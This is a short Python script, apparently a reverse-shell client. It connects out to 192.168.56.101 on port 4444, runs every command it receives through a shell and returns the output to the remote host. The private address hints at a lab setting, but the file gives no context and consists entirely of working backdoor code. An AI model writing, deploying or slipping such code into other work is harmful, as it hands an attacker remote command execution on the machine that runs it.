import socket
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.56.101", 4444))

while True:
    command = client.recv(4096).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    client.send(output.encode())

client.close()
